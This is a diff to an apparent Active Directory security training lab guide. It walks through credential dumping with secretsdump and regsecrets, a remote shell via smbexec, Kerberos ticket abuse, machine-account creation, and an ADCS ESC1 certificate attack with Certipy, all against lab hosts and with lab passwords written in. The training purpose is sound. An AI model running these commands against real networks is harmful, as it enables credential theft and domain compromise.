@@ -261,21 +261,27 @@ ssh doadmin@'YOUR-PUB-C2-IP'
 
 # Installing Tools Rapid Fire Style
 
-We packed a bunch of tools onto your Linux system during the build process. So, there's a start, but here's some more quick hitters. We regularly wrap python tools in virtual environments, so be prepared to `activate` and `deactivate`. Also, install virtual-env. 
+You need root perms for most of the tools in this lab, sudo up.
 
+```bash
+sudo -s
 ```
+
+We packed a bunch of tools onto your Linux system during the build process. We regularly wrap python tools in virtual environments, so be prepared to `activate` and `deactivate`. Also, install virtual-env. 
+
+```bash
 apt install python3-virtualenv -y 
 ```
 
 Or, use pip. 
 
-```
+```bash
 pip3 install virtualenv
 ```
 
 Now, let's rock and roll. One of the tools we didn't install via bootstrap on the Linux box was DonPAPI. This is a browser shredder (and more). Copy and paste the following block into your Linux terminal. 
 
-```
+```bash
 cd /opt/
 git clone https://github.com/login-securite/DonPAPI
 cd DonPAPI
@@ -285,6 +291,7 @@ python3 -m pip install .
 DonPAPI -h
 ```
 
+Jump over to the **dc01** RDP session. 
 
 # BadBlood
 
@@ -461,7 +468,7 @@ The account credential used to access the environment has sufficient privilege t
 |----------------------|-------------------|
 ```bash
 mkdir /opt/hashes 
-secretsdump.py doazlab/doadmin@192.168.2.5 |tee -a /opt/hashes/secrets-output.txt
+secretsdump.py doazlab/doadmin:'DOLabAdmin1!'@192.168.2.5 |tee -a /opt/hashes/secrets-output.txt
 ```
 
 You will be prompted for a password. 
@@ -495,15 +502,8 @@ The smbexec.py utility establishes a semi-interactive shell to a remote host. Th
 | &#x1F427; Bash Input | Linux Host: Nux01 |
 |----------------------|-------------------|
 ```bash
-python3 smbexec.py doazlab.com/doadmin@192.168.2.5
+python3 smbexec.py doazlab.com/doadmin:'DOLabAdmin1!'@192.168.2.5
 ```
-
-You will be prompted for a password.
-
-```bash
-DOLabAdmin1!
-```
-
 
 | &#x1F427; Bash Input | Linux Host: Nux01 |
 |----------------------|-------------------|
@@ -518,7 +518,7 @@ exit
 
 ```
 
-| ![wmiexec.py Connection](img/smbexec.jpg) |
+| ![smbexec.py Connection](img/smbexec.jpg) |
 |------------------------------------------------|
 
 &#x21E8; *Step Complete, Go to the next step!*
@@ -543,6 +543,9 @@ The getTGT.py utility is used to request authentication tickets (Kerberos) from 
 python3 getTGT.py -dc-ip 192.168.2.4 doazlab.com/doadmin:'DOLabAdmin1!'
 ```
 
+| ![Request TGT for doadmin](img/kerb-ticket-request.jpg) |
+|------------------------------------------------|
+
 | &#x1F427; Bash Input | Linux Host: Nux01 |
 |----------------------|-------------------|
 ```bash
@@ -550,7 +553,20 @@ ls
 export KRB5CCNAME=/opt/impacket/examples/doadmin.ccache
 ```
 
-| ![Request TGT for noprivuser](img/get-tgt-nopriv.jpg) |
+The export process is shown in the next screenshot. 
+
+| ![Export doadmin ticket](img/export-ticket.jpg) |
+|------------------------------------------------|
+
+Install some additional packages for Kerberos on the Linux box with the following command.
+
+```bash
+apt-get install krb5-user libpam-krb5 libpam-ccreds -y
+```
+
+Then run `klist` to take a peek at the exported ticket[s]. After export, the ticket should look something the following.
+
+| ![klist invoke](img/klist-invoke.jpg) |
 |------------------------------------------------|
 
 &#x21E8; *Step Complete, Go to the next step!*
@@ -565,16 +581,16 @@ export KRB5CCNAME=/opt/impacket/examples/doadmin.ccache
 
 </summary><blockquote>
 
-Let's use the Kerberos ticket we grabbed with getTGT.py to add a computer object to the domain. Always remember - any user can add up to ten computers to a domain by default (MS-DS-MachineAccountQuota). Trust us, you need to learn to how to use
+Let's use the Kerberos ticket we grabbed with getTGT.py to add a computer object to the domain. Always remember - any user can add up to ten computers to a domain by default (MS-DS-MachineAccountQuota). Trust us, you need to learn to how to use ticketing and ticketing related tools. NTLM will eventually be deprecated. 
 
 
 | &#x1F427; Bash Input | Linux Host: Nux01 |
 |----------------------|-------------------|
 ```bash
-python3 addcomputer.py -computer-name lowprivPC -computer-pass L0wPr1VSys -k -no-pass -dc-ip 192.168.2.4 doazlab.com/doadmin@192.168.2.4 -dc-host dc01
+python3 addcomputer.py -computer-name lowprivPC -computer-pass L0wPr1VSys -k -no-pass -dc-ip 192.168.2.4 doazlab.com/doadmin:'DOLabAdmin1!'@192.168.2.4 -dc-host dc01
 ```
 
-| ![Add computer to the domain using doadmin's Kerberos ticket](img/add-machine-acct.jpg) |
+| ![Add computer to the domain using doadmin's Kerberos ticket](img/machine-addition-kerberos.jpg) |
 |------------------------------------------------|
 
 &#x21E8; *Step Complete, Go to the next step!*
@@ -585,7 +601,7 @@ python3 addcomputer.py -computer-name lowprivPC -computer-pass L0wPr1VSys -k -no
 
 <Details><summary>
 
-## &#x2468; Use Net.py 
+## &#x2468; Use Regsecrets with a Kerberos Ticket 
 
 </summary><blockquote>
 
@@ -595,22 +611,171 @@ The regsecrets.py utility was designed as an improvement on the secretsdump.py u
 Take a look at the tool's help file too. Kent says: "Know your tools."
 
 
-
 | &#x1F427; Bash Input | Linux Host: Nux01 |
 |----------------------|-------------------|
 ```bash
-python3 net.py
+python3 regsecrets.py
 ```
+
+| ![Help regsecrets.py](img/help-regsecrets.jpg) |
+|------------------------------------------------|
+
 
 Use the following command to quietly and filelessly dump creds from the WS05 system. 
 
 | &#x1F427; Bash Input | Linux Host: Nux01 |
 |----------------------|-------------------|
 ```bash
-python3 regsecrets.py 
+python3 regsecrets.py -k -no-pass -dc-ip 192.168.2.4 doazlab.com/doadmin@ws05.doazlab.com |tee -a /opt/hashes/192-168-2-5-secrets
 ```
 
+| ![Invoke regsecrets.py using ticket](img/invoke-regsecrets.jpg) |
+|------------------------------------------------|
 
 &#x21E8; *Step Complete, Go to the next step!*
+
+</blockquote></details>
+
+
+
+
+<Details><summary>
+
+## &#x2468; Extras from here out. 
+
+</summary><blockquote>
+
+This lab is designed to teach participants how to install Active Directory Certificate Services (ADCS), import certificate templates using PowerShell and assess these vulnerabilities using Certipy. 
+
+<br />
+
+
+_Conduct Lab Operations from Domain Controller DC01_
+
+Launch PowerShell on domain controller and install some important ADCS features. 
+
+| &#x1FA9F; PowerShell Input | Domain Controller: DC01 |
+|----------------------------|-------------------------|
+```PowerShell
+Get-WindowsFeature -Name AD-Certificate | Install-WindowsFeature
+Add-WindowsFeature Adcs-Cert-Authority -IncludeManagementTools
+```
+
+| ![Install ADCS Features](img/add-adcs-features.jpg) | 
+|------------------------------------------------|
+
+| &#x1F427; PowerShell Input | Linux Host: DC01 |
+|----------------------|-------------------|
+
+Next, we will download previously exported templates.  First, enter the c:\add folder.
+
+| &#x1FA9F; PowerShell Input | Domain Controller: DC01 |
+|----------------------------|-------------------------|
+```PowerShell
+mkdir c:\add
+cd c:\add
+```
+
+Next, download the templates with PowerShell
+
+| &#x1FA9F; PowerShell Input | Domain Controller: DC01 |
+|----------------------------|-------------------------|
+```PowerShell
+$wc = new-object System.Net.WebClient
+$wc.DownloadFile('https://raw.githubusercontent.com/DefensiveOrigins/ADD_Extras/main/ADCS/DOAZLab_Computer.json', 'c:\add\DOAZLab_Computer.json')
+$wc.DownloadFile('https://raw.githubusercontent.com/DefensiveOrigins/ADD_Extras/main/ADCS/DOAZLab_User.json', 'c:\add\DOAZLab_User.json')
+$wc.DownloadFile('https://raw.githubusercontent.com/DefensiveOrigins/ADD_Extras/main/ADCS/DOAZLab_IPSec.json', 'c:\add\DOAZLab_IPSec.json')
+ls c:\add
+```
+
+| ![Template Downloads](img/template-downloads.jpg) |
+|------------------------------------------------|
+
+Next, import the certificate templates that were downloaded.
+
+| &#x1FA9F; PowerShell Input | Domain Controller: DC01 |
+|----------------------------|-------------------------|
+```PowerShell
+net1 user noprivuser N0PrivU53R /add /domain 
+Install-Module ADCSTemplate -Force
+New-ADCSTemplate -DisplayName DOAZLab_Computer -JSON (Get-Content c:\add\DOAZLab_Computer.json -Raw) -Publish
+New-ADCSTemplate -DisplayName DOAZLab_User -JSON (Get-Content c:\add\DOAZLab_User.json -Raw) -Publish
+New-ADCSTemplate -DisplayName DOAZLab_IPSec -JSON (Get-Content c:\add\DOAZLab_IPSec.json -Raw) -Publish
+Set-ADCSTemplateACL -DisplayName DOAZLab_Computer  -Enroll -Identity 'DOAZLab\Domain Computers'
+Set-ADCSTemplateACL -DisplayName DOAZLab_User  -Enroll -Identity 'DOAZLab\Domain Users'
+Set-ADCSTemplateACL -DisplayName DOAZLab_IPSec -Enroll -Identity 'DOAZLab\Domain Users'
+```
+
+| ![Template Imports](img/template-imports.jpg) |
+|------------------------------------------------|
+
+
+_Conduct Lab Operations from Linux Host Nux01_
+
+Here, you will access a privileged terminal session, activate a virtual environment, and ask Certipy to find vulnerable ADCS templates. 
+
+The next command should not require a password (passwordless sudo).
+
+
+| &#x1F427; Bash Input | Linux Host: Nux01 |
+|----------------------|-------------------|
+```bash
+sudo -s
+```
+
+| ![Sudo -s](img/sudo-s.jpg) |
+|------------------------------------------------|
+
+Next, we will run certipfy to assess the ADCS environment.
+
+| &#x1F427; Bash Input | Linux Host: Nux01 |
+|----------------------|-------------------|
+```bash
+cd /opt/Certipy
+source /root/pyenv/Certipy/bin/activate
+certipy find -vulnerable -target-ip 192.168.2.4 -u noprivuser@doazlab.com -p 'N0PrivU53R' -output adcs-vulns
+```
+
+| ![Find Vulnerable Templates](img/adcs-find-vuln.jpg) |
+|------------------------------------------------|
+
+Lets insepct the produced results.
+
+| &#x1F427; Bash Input | Linux Host: Nux01 |
+|----------------------|-------------------|
+```bash
+cat adcs*.txt
+```
+
+| ![ESC1 Vulnerability](img/esc1-vuln.jpg) |
+|------------------------------------------------|
+
+In the next step, we will attempt to exploit one of the weak certificate templates.
+
+| &#x1F427; Bash Input | Linux Host: Nux01 |
+|----------------------|-------------------|
+```bash
+certipy req -target-ip 192.168.2.4 -u noprivuser@doazlab.com -p 'N0PrivU53R' -ca doazlab-DC01-CA -template DOAZLab_User -dc-ip 192.168.2.4 -upn doadmin@doazlab.com
+```
+
+| ![Certipy Request Cert](img/certipy-req.jpg) |
+|------------------------------------------------|
+
+UnPac the Hash Attack
+
+
+
+| &#x1F427; Bash Input | Linux Host: Nux01 |
+|----------------------|-------------------|
+```bash
+certipy auth -pfx doadmin.pfx -dc-ip 192.168.2.4
+```
+
+| ![Certipy Authenticate](img/certipy-auth.jpg) |
+|------------------------------------------------|
+
+&#x21E8; *Step Complete, Go to the next step!*
+
+
 
 </blockquote></details>
